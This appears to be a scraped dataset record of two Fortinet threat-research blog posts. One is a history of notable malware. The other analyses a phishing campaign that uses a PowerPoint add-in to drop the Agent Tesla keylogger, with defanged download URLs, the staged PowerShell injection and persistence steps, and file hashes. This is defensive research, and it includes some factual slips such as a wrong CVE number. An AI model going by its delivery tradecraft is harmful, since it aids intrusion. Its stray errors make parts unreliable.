8f05a6ee54b89de50e84fcd9db9191f3dd80c701a436ab4c81a1309b2d649368 3a1f0cfbea0de5acca77595a6a5384c31859c255defa12449861e6755b41aa20 6516d944f93186e7d422e7b93a476d4b04db0ed279ba93c4854d42387347d012 9ca7f4e809a8d381fa0bc8e02627d597add2de4c5d57632cae422c59a1e971e2 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/evolution-of-malware": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-03-15",
                    "source": "www.fortinet.com"
                },
                "text": "A “computer virus” is one of the few transcendent technical terms everyone understands, including children. Regardless of socioeconomic background or age, everyone has an immediate negative connotation to that term. It is usually associated with something destructive to the technology we all rely on, whether it’s a laptop, smartphone, application, or gaming system, demonstrating how ubiquitous computers and technology have become in our daily lives. Part of the reason is that we have all been exposed to the impact of viruses, such as the flu or the common cold. And like its biological counterparts, a computer virus also replicates and can be transmitted from one host to another, creating problems ranging from annoying to downright destructive. So, in recognition of over 50 years since the first computer virus was discovered, we have decided to provide a brief historical insight into the history of computer malware from the pre-internet era to the current world of botnets, ransomware, viruses, worms, and more. To start, here is some basic terminology: A virus cannot replicate without human interaction, whether clicking a link, opening an attachment, launching an application, or downloading a file. A worm does not require human interaction and can replicate on its own, tunnel deep into systems, and move between devices. Malware is a generic term that encapsulates all threats—viruses, worms, botnets, ransomware , etc.—anything malicious that is software-related. It would be impossible to cover all malware and events over the past 50 years in such a short blog post. Instead, we’ve highlighted many of the most notable examples and memorable events of the past 50 years. The early years 1971: The first Proof of Concept Before the internet existed, at least in the form we know today, there was the Advanced Research Projects Agency Network, or ARPANET, for short. ARPANET began in 1967 to try and connect remote computers. The first computers were connected in 1969, and one year later, the Network Control Program (NCP) was developed (the predecessor to the modern TCP/IP stack). NCP was the first network transport layer to enable data to flow from computer to computer. In 1971, the first microprocessor was developed, the Intel 4004. It was the first commercially produced general-purpose CPU. Its size (two inches rather than 12), price ($60), and performance (comparable to much larger and more expensive processors) ushered in a new era in computing Ironically, 1971 also saw the premier of the world’s first virus Proof of Concept, dubbed “The Creeper.” Although credited and referenced by various entities as the world’s first computer virus, the Creeper actually exhibited the behavior of a worm. Based on a concept first articulated by German mathematician John von Neumann in the 1940s, it was built at BBN (an American research and development company later acquired by Raytheon) by engineer Bob Thomas. It spread through ARPANET computers and posted the following message: \"I'm the creeper, catch me if you can!\" Like its modern worm successors, it spread via a network protocol. The intent was not for malicious or devious reasons, but to see if the “I’m the creeper, catch me if you can” message could propagate to other computers via ARPANET. It did. 1982: The first Mac virus Contrary to what every non-technical person says, “Macs are not susceptible to viruses,” the first computer virus found in the wild, dubbed “Elk Cloner,” was designed to target Apple II computers. It was written by a then-15-year-old, who wrote such programs to play pranks on his friends. This boot sector virus propagated whenever an infected disk was run. The virus would reside in memory and look for a clean floppy disk to infect. It displayed the following message: On the fiftieth boot, Elk Cloner would display a poem to the user: Elk Cloner: The program with a personality It will get on all your disks It will infiltrate your chips Yes, it’s Cloner! It will stick to you like glue It will modify RAM too Send in the Cloner! 1986: The first PC virus In 1986, computing was still rudimentary (slow and not internet connected). The very first iterations of the internet were relegated to governments and universities. It would be at least three years before Internet Service Providers (ISPs) started providing public access to the internet, in 1989. Sure, Bulletin Board Systems (BBS) existed, but they required making a phone call to a direct point of presence (POP) hosted by the BBS operator. Connections to the BBS were usually limited to the local audience of the BBS because phone calls to the BBS from outside the area code were billed by the minute, making them quite expensive. However, 1986 also saw the launch of the first PC virus, dubbed “Brain.” It changed the information security world as we know it today. It originated in Pakistan but quickly spread worldwide to Europe and North America. Ironically, the virus had replicated from machine to machine because of an anti-piracy countermeasure. The Brain virus was developed by Amjad Farooq Alvi and Basit Farooq Alvi, two brothers from Pakistan who created a boot sector virus that loaded a warning to individuals using a pirated copy of their medical software. Of course, because there wasn’t any internet, it spread through human interaction via the copying of floppy disks. Unbeknownst to the user, the master boot record (MBR) of the victim’s machine was infected while making an illegal copy of the software and spread when the disk was inserted into the next machine. Because there was no way to know that an infected MBR virus was coming along for the ride, it spread until it became a global phenomenon. Luckily for many, it wasn’t a destructive virus. It hid a particular sector so the machine wouldn’t boot and displayed a notification that included contact information of the Farooq Alvi brothers for remediation. They claim that they wanted affected individuals to call them to discuss how to obtain their software legally. Within the notification, it stated: Welcome to the Dungeon (c) 1986 Amjads (pvt) Ltd VIRUS_SHOE RECORD V9.0 Dedicated to the dynamic memories of millions of viruses who are no longer with us today - Thanks GOODNESS!!! BEWARE OF THE er..VIRUS : this program is catching program follows after these messages....$#@%$@ !! Welcome to the Dungeon © 1986 Basit & Amjads (pvt). BRAIN COMPUTER SERVICES 730 NIZAM LBOCK ALLAMA IQBAL TOWN LAHORE-PAKISTAN PHONE: 430791,443248,280530. Beware of this VIRUS.... Contact us for vaccination... Their ingenious plan proved to be so successful that the brothers were swamped with phone calls from all over the world. 1988: The Morris worm The difference between a virus and a worm is that a worm doesn’t need human interaction to propagate. Over 30 years ago, the world’s first worm was born. It was called the Morris worm, after its author, Robert Morris. This worm was not malicious. It was created as a Proof of Concept to see if hands-off replication was possible. The worm contained several firsts. It exploited vulnerabilities in various programs and services and checked to see if an existing infection was present, all behaviors of modern malware. And because Morris was worried that system administrators would quarantine the worm and ignore the infection, he programmed it for persistence. However, there was no way to stop the self-replication process, so it caused high loads on devices, rendering them inoperable, and caused a denial-of-service (DoS) in networks as it spread from machine to machine. Mr. Morris was the first convicted under the Computer Fraud and Abuse Act. However, he later became a successful entrepreneur and was awarded tenure at the Massachusetts Institute of Technology (MIT). 1989: World’s first ransomware In 1989, the AIDS Trojan debuted, making it the worlds’ first observed ransomware . Coincidentally, internet access was also first publicly available in 1989 for the first time through an ISP called TheWorld, out of the United States. However, ransomware did not take advantage of internet connectivity to infect and target victims until 2005. In 1989, the human AIDS virus was highly topical and relevant worldwide, similar to today’s COVID-19-related news. The AIDS Trojan was sent via mail (yes, physical mail, not email) to AIDS researchers worldwide via 20,000 infected floppy disks. Once the disk was run, it contained a questionnaire about AIDS. But on the ninetieth reboot, it changed file names to encrypted strings and hid them from the user. The screen then displayed a demand for $189 for a yearly lease or $385 for a lifetime license, sent to a PO Box in Panama. Only bankers’ drafts, cashiers’ checks, or money orders were accepted. The AIDS Trojan was attributed to the late Dr. Joseph Popp, who claimed that he created the ransomware to donate the funds he collected to AIDS research. However, other reports state that he was upset with the World Health Organization after being rejected by them for a job. On an interesting note, Dr. Popp did not send any of his floppy disks to researchers in the U.S. Forensic analysis of the malware revealed that the encryption key of the malware was “Dr. Joseph Lewis Andrew Popp Jr.” Dr. Popp was arrested and charged in the U.K., but during criminal proceedings, he was declared mentally unfit and deported back to the United States. 1992: Michelangelo Michelangelo was the next high-profile virus to make a significant impact. Michelangelo was a boot sector virus that targeted DOS partitions. It was written in Assembly, and like its predecessors, it was spread via floppy disks due to its targeting of the master boot record and infection of attached floppy stores, allowing it to spread during the copying and loading process. It was named Michelangelo because it had been programmed with a time bomb—an instruction to awaken on March 6, Michelangelo's birthday. What made it infamous was that after it was discovered, there was a lot of media coverage warning users to either leave their computers off on that day or change the date on their machines to a day ahead to avoid being impacted. This was the first time a virus had received so much attention from the mainstream media, in both print and television , helping to spur anti-virus software sales worldwide . 1994-95: The warez scene and the first phishing attacks As internet usage gained traction in the United States through the launch of services such as America Online (AOL), CompuServe, and Prodigy, so did the growth of scams and phishing. For many who grew up in AOL chatrooms, the progz (slang for programs) and warez (slang for software) scene of the mid-90s was revolutionary. Because dial-up internet access was quite expensive, being provisioned by the minute, many threat actors were interested in stealing account credentials. New programs began being traded on illicit warez chatrooms that contained punterz (to kick people offline), phishing progz (to steal user accounts), and tools used to generate random credit cards. One of the most famous programs was AOHell, a play on the name of AOL, which contained a random account creator that used randomly created credit card accounts to open an account for free for a month. It also contained one of the first evidences of phishing. Fake automated AOL instant message bots sent indiscriminate IMs to targets asking them to verify their account credentials, claiming there was a problem with billing or some similar issue. To continue talking to the bot, the victim would have to “verify their identity” by entering their username and password. This information was then harvested by the users of the AOHell program to use or sell for free account access and spam. Other nuances seen in AOL warez rooms were programs that promised to do specific things, but that were actually credential harvesters targeting uninformed “n00bs,” or beginner users/newbies. Welcome to Y2K The dawn of the new millennium saw more and more people connected globally. And at the same time, there was a dramatic increase in the volume of attacks due to the increased number of potential victims, driven by the hyper-growth of the internet. Besides the growth of new high-tech companies (the dotcom bubble), 1999 was a year mired in fear about the “Y2K” bug. While not a virus, Y2K caused widespread panic because there was a fear that legacy computers would stop operating after December 31, 1999, due to a design flaw in the BIOS, which controls the computer's motherboard. When rebooted on January 1, 2000, the operating system would believe it was January 1, 1900, disrupting everything from gas pumps and elevators to trading floors and power plants. Ultimately, this design flaw proved to be less of a problem than thought, and most organizations and individuals escaped unscathed. But the fear of Y2K dominated the news across the world for months. 1999/2000: First botnet appears By 2000, broadband access was starting to gain traction beyond those organizations that could afford access to a T1 line via Digital Subscriber Line (DSL) connections. Home users and organizations were now able to be online 24x7. And over the next few years, cybercriminals exploited this ubiquitous access by ushering in the era of botnets and worms. When botnets first arrived, the term invoked thoughts of Skynet, the fictitious corporate villain from the Terminator movies. But AI was still the domain of science fiction (and, of course, 22 years later, we are still only at the beginning stages of AI). But that doesn’t mean that botnets weren’t a problem. Simply put, a botnet is a group of compromised computers under the command and control of an operator. Back then, botnets were simple. They infected and spread between machines, with most botnet malware connecting to a predetermined command and control server (C2) on Internet Relay Chat (IRC—think of old AOL chatrooms) to receive instructions. The first observed botnet was the EarthLink Spam botnet, which made its debut in 2000. It had a simple task: to send out massive quantities of spam. The EarthLink Botnet accounted for 25% of all email spam at the time, about 1.25 billion messages in total. Because of this brazen campaign, it landed an unprecedented judgment against its operator Khan C. Smith for USD$25 million. However, the GTbot was introduced in 1999, making it the actual first botnet. In terms of malware, it was very rudimentary. It essentially spread itself to other machines and received commands via IRC. These commands were issued by GTbot controllers, who used this network of affected devices (known as zombies) to launch distributed denial-of-service ( DDoS ) attacks. The rise of the worm Worms are still part of a threat actor’s arsenal, though not as commonplace today. As explained earlier, worms are different from viruses as they do not need human interaction to spread. And because a worm propagates on its own, it can spread widely in a short amount of time. Regardless of its intention, being infected by a worm during this time period was usually quite noticeable because it often led to a denial-of-service (typically due to a flaw). Because they consume ever-increasing operating system cycles, they eventually force an infected machine to come to a grinding halt. The resulting DoS attack can cascade across an organization as the worm spreads, disrupting an entire organization, whether that was its intention or not. 2000: I LOVE YOU 2000 Blaster Sasser The I LOVE YOU worm opened the millennium with significant media coverage because it spread around the world at record speed. The I LOVE YOU worm was created by a Onel De Guzman, a college student in the Philippines. The I LOVE YOU worm propagated using multiple mechanisms. First, it was sent to users via email as a malicious attachment, “LOVE-LETTER-FOR-YOU.vbs.txt.” When opened by the victim, the worm would look for the victims’ Microsoft Outlook address book and send out emails impersonating the victim and replicating itself as an attachment. This novel approach caused millions of computers to be infected in days as many people trusted the emails coming from trusted associates, including friends, family, and colleagues. This method of scraping a target’s address book and impersonating them in email is still used as part of a threat actors’ tradecraft (EMOTET). 2003: Blaster (MSBlast, lovesan) By August 2003, many individuals and organizations were connected to the internet using a broadband connection. This gave rise to record-breaking worm and wormlike attacks. On August 11, 2003, Blaster (also known as MSBlast and lovesan) was launched. Home users and workers at large organizations were shocked when their machines suddenly experienced the dreaded “Blue Screen of Death” (BSOD) and rebooted. What they didn’t know was that they had been disrupted by the Blaster worm. Blaster targeted a remote procedure call (RPC) vulnerability in Microsoft Windows XP and 2003 operating systems to propagate worldwide. The worm's goal was to perform a SYN flood attack against windowsupdate.com to prevent machines from accessing updates. Luckily for Microsoft, the author made the mistake of directing Blaster to the wrong domain. The windowsupdate.com domain was nonessential as machines instead used windowsupdate.microsoft.com to receive their updates. However, due to a bug in the worm, it also caused a denial-of-service (BSOD) due to buffer overflow. Continued reboots did nothing to hamper the effort, as it just started over, shutting machines off over and over. As a result of the wide adoption of internet connectivity, this became the first global denial-of-service attack. The intentions of the authors were revealed in an ominous message found within the malware’s binary: I just want to say LOVE YOU SAN!! billy gates why do you make this possible ? Stop making money and fix your software!! The worm resulted from the reverse engineering of a Microsoft Patch Tuesday patch (colloquially known as Exploit Wednesday). Blaster did not affect organizations that had applied the ( MS03-026 ) patches before August 11th. This example stresses the importance of organizations patching systems as quickly as possible once an update is released. Unfortunately, to this day—18 years later—many organizations still ignore this advice. Honorable mentions Code Red (2001) This hybrid worm looked for vulnerable web servers running Microsoft IIS. Once it found a vulnerable server, it displayed the following message: HELLO! Welcome to http://www.worm.com! Hacked By Chinese! It also launched DDoS attacks against predetermined sites. MyDoom (2004) This was the fastest spreading email worm, surpassing I LOVE YOU. MyDoom still holds the record for this feat. The Dawn of Cybercrime 2005: Mytob/Zotob, combining worms/backdoors/botnet Before Mytob, the world of malware was mainly limited to enthusiasts who created malware out of a desire to create mischief or sheer curiosity. However, the Mytob/Zotob variants changed everything. Mytob essentially combined the functionality of a worm/backdoor/botnet. It is a variant of MyDoom and was created by the same coder that created the Zotob worm. Mytob infected victim machines in two ways. It either arrived via email through malicious attachments or exploited vulnerabilities in the LSASS (MS04-011) protocol or RCP-DCOM (MS04-012) and used remote code execution. It also utilized the victim’s address book to propagate itself and searched for other machines via network scans to see if they could be compromised. Mytob was one of the first viruses to specifically block or work against anti-virus software by preventing connectivity from the victims’ machine to various update sites. This was done by redirecting all known vendor URIs to 127.0.0.1, a localhost IP. This caused all queries to public-facing websites to resolve to the machine itself, essentially going nowhere. Mytob was very prolific for its time and was consistently listed at the top of Top 10 charts. It had so many variants with different functionalities that anti-virus companies often had the entire alphabet appended to the malware name. The Zotob variant took remnants of the Mytob source and incorporated MS05-039 , which was a buffer overflow vulnerability in Microsoft Plug and Play for Windows 2000. Zotob used this variant to scan for machines vulnerable to MS05-039 to further propagate. Mytob/Zotob variants were incredibly disruptive, taking down the operations of 100 organizations, including the NY Times . It was so disruptive that even CNN News anchor Wolf Blitzer announced that Lou Dobbs could not get on the air for his regularly scheduled programming. The era of spyware and hijacked search results 2005: CoolWebSearch and BayRob CoolWebSearch, commonly known as “CWS, was the first cybercrime operation to hijack search results from Google, overlaying search results with those from the threat actors themselves. This was done to steal clicks from Google. CWS was most often distributed using drive-by downloads or adware programs. It was so pervasive and hard to remove that volunteers developed programs and managed web forums to help remove CWS infections for free. CWS Shredder was one of several programs widely used by victims of CoolWebSearch to help remediate their machines. A similar attack appeared several years later, in 2007. It used a variation of hijacking search results from eBay. It was discovered when a woman in Ohio purchased a car for several thousand dollars, and the vehicle never arrived. Authorities later determined that this car had never been listed for sale and that her machine had malware that injected fake listings on her device via the BayRob malware. In a great example of cat and mouse, the FBI and Symantec waited patiently for years for the cybercriminals to make a mistake, which culminated in their arrests in 2016 . From spyware to spy vs. spy and the discovery of nation-state cyber weapons 2010: Stuxnet Ushering in the 2010s was the first discovery of nation-state malware being used to target Industrial Control Services (ICS) devices—specifically, supervisory control and data acquisition devices (SCADA). Stuxnet proved to be the first specific nation-state malware targeting critical infrastructure—in this case, industrial centrifuges (specifically nuclear), causing them to overspin and cause a meltdown. Stuxnet specifically targeted organizations in Iran but soon spread to other SCADA systems around the world. Analysis of the Stuxnet malware highlighted that it wasn’t specific to Iran and could be tailored to any organization running similar ICS devices. In 2012, a NY Times article confirmed that the United States and Israel developed Stuxnet. 2011: Regin Regin is a highly modular Remote Access Trojan (RAT). This allowed it to be highly flexible, adapting to a targeted environment. Regin was also successful because it was very innocuous in its operation. Files that were exfiltrated were often kept in an encrypted container. But instead of being stored in multiple files, everything was held in a single file, thereby avoiding arousing the suspicions of system administrators or AV software. According to Der Spiegel, Regin was a creation of the United States NSA and designed to spy on the EU and its citizens. This information was disclosed through the infamous classified information leak provided by Edward Snowden . 2012: Flame Flame was considered the most advanced malware ever found at the time of discovery. It had everything—a wormlike capability to spread via LAN networks, it could record and capture screenshots and audio, it could eavesdrop on and record Skype conversations, and it could turn Bluetooth workstations into listening beacons that could then exfiltrate and move files to other beacons, ultimately sending files to a predetermined C2 server. Flame primarily targeted organizations in the Middle East. The Ushering of the Modern Era of Ransomware 2011/12: Reveton Reveton was not the first “ransomware” of the Internet-connected age. That distinction belongs to GPCODe (2005) and others. However, Reveton was the archetype of modern ransomware, helping establish the look and feel that still exists to this day, including the ubiquitous lock screen that provides details of what happened, how to get in touch with the bad actor, how to pay the ransom, and how to decrypt files, etc. Reveton also generated a lot of press because it had all the hallmarks of being run by a professional cybercriminal organization. It was not only professional in appearance, but also utilized templates, which was another first. Lock screens would be displayed to the user based on geolocation and present the victim with a lock screen of a local law enforcement organization along with instructions on how to make payment. Reveton used so many templates that researchers often cited releases based on its fall/winter/spring/summer templates. 2013: CryptoLocker - the arrival of cryptocurrency as a payment option CryptoLocker was the first ransomware to demand payment via Bitcoin. The price for decryption was two BTC, which in 2013 (depending on the timeframe) was somewhere between $13 and $1,100, which netted the threat actors a modest sum. Remember, this was when cryptocurrency was still in its infancy, and getting non-technical victims to not only pay but understand how to even use cryptocurrency was a hurdle to overcome. 2013: DarkSeoul and Lazarus Besides ransomware, 2013 also ushered in the era of sinister state-sponsored attacks. DarkSeoul, as one attack was called, targeted the Korean broadcaster SBS and banking institutions in South Korea on March 20, 2013. The malware used in this attack, Jokra, targeted a device’s master boot record (MBR) and overwrote them. Many users of internet service providers, telecoms, and ATMs were also affected as their networks were taken offline. This attack was attributed to Lazarus (North Korea), which also targeted Sony Corporation in 2014 by leaking confidential information in response to “The Interview,” a film that mocked North Korean leader Kim Jong Un. The Lazarus team was also associated with attacks against the Bank of Bangladesh in 2016. They attempted to steal $951 million but only managed to get away with $81 million due to various flags in the banking transaction chain. 2015: Browser Locker and fake technical support scams (BSOD) Although technically not malware, the first technical support scams and various browser locker variants first appeared in 2015. These nuisance attacks essentially mimic ransomware by causing victims to either panic and call a support number to a threat actor acting as technical support in a different country or by simply paying cryptocurrency to “clean” their system. The scheme deployed malicious JavaScript on legitimate websites that had been compromised. This JavaScript would then render a browser inoperable, frequently displaying warnings and demands in full-screen mode (payment to unlock, selling fake remediation software or technical services, etc.). Other variations of this strategy were Blue Screen of Death (BSOD) displays, which looked convincing to the victim, including a toll-free number claiming to be Microsoft technical support, but in fact, it was a threat actor in a call center in a foreign country. The threat actor would then attempt to convince the victim to provide remote access to their device for “remediation,” after which they would take control of the victim’s machine to perform further malicious acts while charging exorbitant fees for nonexistent services. 2016: The first IoT botnet arrives The arrival of Mirai surprised many. It was the first botnet to target IoT devices. While it primarily targeted network routers, it included other IoT devices. Mirai was mainly a DDoS botnet. and was involved in notable attacks against Brian Krebs’s website, krebsonsecurity.com. as well as being responsible for taking down a massive segment of the internet, disrupting access and services worldwide Unlike traditional network and end-user devices, most IoT devices are not maintained. That is, they don’t receive updates on an automated basis, as a computer or smartphone does. Instead, they are often neglected and hardly are ever updated, usually because updates require that they be flashed (meaning taken offline so the software and firmware can be overwritten entirely), which can be inconvenient or even disastrous because flashed devices can be bricked (meaning permanently rendered inoperable) if done wrong. To make matters worse, many people who connect IoT devices to the internet directly do not change their default username and password. Mirai exploited this vulnerability, allowing it to propagate without any difficulty. Mirai was so prolific at one point that even famed cryptologist Bruce Schneier thought it may have been the creation of a nation-state. Mirai was not only a high-profile attack because it was novel but also because it was able to amass a global botnet army in such a short amount of time, allowing it to redirect internet traffic to targeted sites from infected systems around the world. This made it especially hard to defend against, as the flood of traffic came from everywhere. In fact, variants of Mirai are still alive and kicking, as noted in a recent FortiGuard Labs blog , partly because the developers eventually released its code online for other criminals to use. 2017: ShadowBrokers (NSA), WannaCry, Petya/NotPetya, and not disclosing vulnerabilities The ShadowBrokers leak of the United States National Security Agency (NSA) was unprecedented and devastating—not just because it revealed secret malware being developed at the highest levels of the U.S. government, but also because threat actors effectively repurposed the tools and exploits that were released. These tools, codenamed “Fuzzbunch,” were an exploitation framework developed by the NSA. Part of the framework included malware known as DoublePulsar, a backdoor attack that contained the infamous “EternalBlue” exploit. EternalBlue was a zero-day exploit that the NSA kept in their arsenal that targeted Microsoft’s SMB (Server Message Block) protocol (CVE-2017-0444). It was later used to spread the infamous WannaCry , Petya/NotPetya ransomware, with disastrous consequences. These ransomware variants were so disruptive that they caused the shutdown of manufacturing facilities worldwide. Attribution for this leak was initially blamed on Russia, but to this day, nobody has been able to attribute the ShadowBrokers hack/leak to an entity. 2017: Mining for crypto Even though cryptocurrency-related threats were relegated initially to Ransomware or cryptocurrency wallet thefts, 2018 introduced a method never seen before. XMRig is a miner application written to mine for Monero cryptocurrency and is not malicious. It works by utilizing unused CPU cycles on a machine to help solve various mathematical problems used in cryptocurrency mining. However, cybergangs began surreptitiously installing XMRig on compromised machines and devices and then collecting and aggregating the resulting data for their own crypto profit. Common vulnerabilities exploited by various criminal attackers utilized known exploits in Apache Struts, Oracle Weblogic, and Jenkins Servers. As a result, these attacks were relegated to organizations that used these technologies and, most important to the attackers, the powerful CPUs of the devices they ran on. These vulnerabilities were also targeted because they were remotely exploitable. Compounding matters, many of these internet-facing machines were also unlikely to be patched, either through carelessness or laziness, allowing threat actors to leverage them for profit. For some fascinating insight on how these attacks worked, please reference our blog from 2018 here . Variants of campaigns that incorporated XMRig in their attacks also targeted mobile devices via malicious Android APKs, docker containers, and supply chain attacks targeting NPM (node package manager), to list a few. For additional information on these latest attacks on the NPM supply chain, please see our Threat Signal from November, Cryptominer and Infostealer Delivered via Hijacked Popular NPM Library . 2019: GandCrab and the emergence of Ransomware as a Service GandCrab ushered in a new wave that has escalated the volume and virulence of attacks by providing ransomware for the masses—for a fee. GandCrab sought to do two things: distance itself from the actual attacks on organizations and generate more revenue. It perfected the business model known as Ransomware-as-a-Service (RaaS). RaaS gave the GandCrab authors the luxury of working on their code while getting others to perform the actual breaches. In this model, affiliates would do all the dirty work (reconnaissance, lateral movement, delivering the ransomware, collecting the money, etc.) while the authors stayed in the background and took a cut (estimates are that they collected between 25% and 40%) of the actual ransom This proved to be lucrative for both parties, as the authors didn’t have to take the risk of finding and infecting targets, and affiliates didn’t have to spend time trying to develop the ransomware themselves. GandCrab also appears to have followed the Agile development process, with minor and major releases deployed whenever the authors would see fit. GandCrab later announced their retirement in June of 2019, after claiming to have netted $2 billion, most likely because they were feeling the heat of the authorities. However, the GandCrab authors would later be loosely affiliated with the Sodonikibi and REvil threat actors, most notably as part of the infamous summer 2021 attack on Colonial Pipeline. Other notable RaaS variants that have emerged since GandCrab are BlackCat, Conti, DarkSide, and Lockbit, to name a few. Conclusion Between 1971 and early 2000, malware was mostly relegated to mischief and attempts by virus authors to see if something they had created would work. Fast forward 20+ years, and we can see that the threat landscape has evolved from mischief to include profitable cybercrime and nation-state attacks. Likewise, the evolution of the initial term “virus” to today’s all-encompassing “malware” reflects the evolution of threats over the past 20 years. It is not coincidental that the development and changes of such attacks have coincided with the development of the hyper-connected world in which we now live. As we embark on the next 25 years—thinking ahead for the 75 th anniversary of threats—we can only assume that threats will continue to target whatever technology or trends that are trending or topical. Of course, it is much easier to forecast the next 12 months, as discussed in our recent “ Predictions for 2022: Tomorrow’s Threats Will Target the Expanding Attack Surface ” blog. Still, one thing remains clear, the biggest single risk will always be the human element. Learn more about FortiGuard Labs threat research and the FortiGuard Security Subscriptions and Services portfolio . Learn more about the Fortinet free cybersecurity training initiative , the Fortinet NSE Training program , Security Academy program , and Veterans program ."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/fake-purchase-order-used-to-deliver-agent-tesla": {
                "metadata": {
                    "dateAccessed": "2022-04-03",
                    "dateCreated": "2022-03-07",
                    "source": "www.fortinet.com"
                },
                "text": "Thanks to Val Saengphaibul who helped contribute to this blog. FortiGuard Labs Research Affected Platforms: Windows Impacted Users: Windows users Impact: Compromised machines are under the control of the threat actor Severity Level: Medium Since the dawn of phishing, fraudulent invoicing and purchasing schemes have been one of the most common lures. The usual modus operandi involves appealing to the recipient’s desire to avoid incurring a debt, especially where a business may be involved. FortiGuard Labs recently came across an interesting phishing e-mail masquerading as a purchase order addressed to a Ukrainian manufacturing organization that deals with raw materials and chemicals. The e-mail contained a PowerPoint attachment that is in reality a sophisticated, multi-stage effort to deploy the Agent Tesla RAT (Remote Access Trojan). What makes this campaign unique is the usage of PPAM, which is a file format that is not very common. A PPAM is a Microsoft PowerPoint add-in that gives developers extra functionality, such as extra commands, custom macros, and new tools. This blog will detail the infection process and subsequent malware deployment. Examining the phishing e-mail Like so many computer-based attacks, this one began as a phishing e-mail sent to an organization in Ukraine. Spelling and grammar issues aside, like most good phishing campaigns this one provides a time sensitive statement urging the recipient to urgently review the attached order. Looking deeper at the e-mail and where it came from, we can see some additional information in the headers. The e-mail originated at an address of 194[.]99[.]46[.]38 that corresponds to slot0.warongsoto.com . This is hosted on a run-of-the-mill VPS server. Visiting the server, we noticed that the site states that the server control panel is controlled by VESTA. Recent CVE data highlights that Vesta Control Panel is affected by remote command execution and elevation of privilege vulnerabilities that ultimately allow for full compromise of the system ( CVE-2020-10786 and CVE-2020-10787 ). The domain itself appears to be either abandoned or at least unused with no active content hosted. It was registered in the United States in October 2021. The originating e-mail address does not appear to reference an actual individual and a search for other instances of this being used elsewhere came up empty. Examining the dropper – stage 1 Phase 1 Dropping the final payload occurs in multiple phases, making this, in actuality, a very complex operation. As shown in Figure 1 , attached to the e-mail is the file “order001.ppam”. This is an add-in file format used by Microsoft PowerPoint that, in this case, contains a malicious macro that acts as a dropper for Agent Tesla. The first phase of stage 1 begins with opening the PPAM attachment to activate the macro contained within. Once the macro is executed, it will reach out to the URL shortener Bit.ly to download the next phase of the dropper. The address used is: hXXp://www[.]bitly[.]com/awnycnxbcxncbrpopor/ Phase 2 The call out to Bitly will be redirected to a location on MediaFire – a file hosting site (hXXp://download2261[.]mediafire[.]com/6lcqxbws032g/wctsdmx4dsh95xs/19.htm). As possibly inferred, this was a campaign and not simply directed at one recipient. There were multiple files made available over several days, as shown below in Figure 4. Each of the files is very similar (with minor tweaks) to the download location of the next step. Figure 5, below, shows 19.htm as it appears if downloaded directly. If we arrange the file into a more readable format, we get a better sense of what it’s trying to do. As seen in Figure 6 , the file attempts to taskkill several applications and services followed by adding a scheduled task into the Windows Task scheduler. The script then attempts to download and execute another file from MediaFire - hXXp://www[.]mediafire[.]com/file/otza6n31talvvle/19.dll. Phase 3 While the file extension gives the impression of a Microsoft dynamic link library (.dll), 19.dll is in actuality a PowerShell script containing instructions in a large amount of hexadecimal data. Once executed, the hexadecimal data will be transformed into additional PowerShell commands that will run in memory. For example, new registry keys will be added to assist with persistence. If captured and reviewed, the entries that stand out the most are two large, compressed byte arrays — $nona and $STRDYFUGIHUYTYRTESRDYUGIRI. As can be seen in Figure 9 , the byte arrays are then decompressed for use. Once decompressed, these can be saved as executable Windows files. $nona is the larger of the two and is Agent Tesla. $STRDYFUGIHUYTYRTESRDYUGIRI will inject Agent Tesla into a running Windows process. Renaming 19.dll to 19.ps1 allows it to be executed as a normal PowerShell script. With this particular sample, it will attempt to launch and then inject Agent Tesla into the aspnet_compiler.exe application. Examining the malware – stage 2 At its core, Agent Tesla is a keylogger and RAT (Remote Access Trojan). It will take any results captured from the keyboard and clipboard and send them back to its C2 (Command and Control) server. In this instance, once injected into the aspnet­_compiler.exe process Agent Tesla will be up and running. With entries in the registry it will have persistence to run even if the host machine is rebooted. As can be seen in Figure 11, this variant is similar to one FortiGuard Labs has analyzed previously . From this point, it will run in the background and observe the user, recording their actions and sending them back to the threat actor. Conclusion Threat actors for the most part like to use lures that are tried and true, as was the case here with the invoicing phishing e-mail, because they continue to enjoy success. The dropper attached to the phishing e-mail shows the continuing evolution and complexity required to evade modern security controls combined with the need to traverse several gates to arrive at the release point for the final payload. Once finally deployed to a system, the ability to obfuscate and hide inside everyday files and processes proves that Agent Tesla is a very capable and formidable threat. Unfortunately, this trend towards increasing sophistication is unlikely to abate any time soon. Fortinet Protections FortiMail’s integrated antivirus, sandbox, and content disarm and reconstruction (CDR) functions detect and disable this malicious attachment. The FortiGuard Antivirus service detects and blocks this threat as: VBA/Agent.GBX!tr JS/Agent.YHB!tr PossibleThreat.PALLAS.H The domain warongsoto.com is blocked by the Web Filtering client. IOCs Sample SHA-256: DLL/PS1 SHA256 27C7F5F2A21298C66A8EEF11DF73BFB1E9EEF7B84974CEF9AF695A7E216EFA21 F86FDC385BA4467FD27093DFB6A642C705199AC3307D24096D7150FB6A80E8FD 9971EE4C59F1838C111CFAA0BC26A6C08B80FD7364C193F6D8DCA1A840D37B7F D147E24E603FB17CE3C6EC839CC8AD07BCE06455037CC0E139CC68042153B7A7 7659EC63CF7010158517AD0DFD3828F8B46592BDBC374D906BACD80A8500DA4B D98D56AEB0A3DBD020C1F6ED9CFE0848A4D8C57DABBB064FBCD0305BDF8B329C 4FD01BF61C49579A40EFDD86D736930585AB3E79D9085177303DDCFF61480E26 7384900E7BB02B1028D92A145CBE2BDB5E3283336C0E5E6014AFCD546B17B985 EFDFD9CCDFB052FD7693403D1E8E085594C1B3B7ED221FD6021F794B5BA752C5 90313F269F0583FBC179BEABAE2A48B1B53594F1FB4A27556861D5D82AD722EC 3C1636CF2A4296840D55A8BAF9ABB56E1C847C5D6E3A7DF0D7040050D017E54C EC9E8CB17C92C4D6175FB3E715F73C4BEF833742168451398A99DE22F06FB52E 87B7F2C05F3E63821DE8AD22EE7ED9CA034CD61332EBAE3E1F76AF085696D5F8 B5CF3D2594E148C458467C833B0D95976480FB054A7763E1F6DCF4187A61E1BE 0C3F881258EF9F1DB9A9923945AB07351DA8BA1A337AACCBCB6B5BD56AE080B3 3B9D6FC6449B7B42E816A19C2B649A5E5CF4E724B2FCD93E56445DECA89FB850 